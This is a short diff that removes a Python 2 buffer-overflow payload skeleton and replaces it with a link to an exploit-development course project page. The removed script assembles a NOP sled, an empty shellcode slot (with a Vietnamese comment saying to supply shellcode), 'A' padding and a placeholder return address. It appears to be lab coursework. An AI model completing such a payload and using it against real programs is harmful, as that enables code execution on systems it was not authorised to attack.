@@ -1,12 +1,1 @@
-#!/usr/bin/python
-
-nopsled = '\x90' * 500
-buf = ""  # Bạn cần xác định giá trị cho buf (ví dụ: một đoạn shellcode)
-eip = '1234'
-
-# Tính toán độ dài của suffix 'A'
-suffix_length = 1012 - len(nopsled) - len(buf) - len(eip)
-suffix = 'A' * suffix_length
-
-attack = nopsled + buf + suffix + eip
-print attack
+https://samsclass.info/127/proj/ED205c.htm
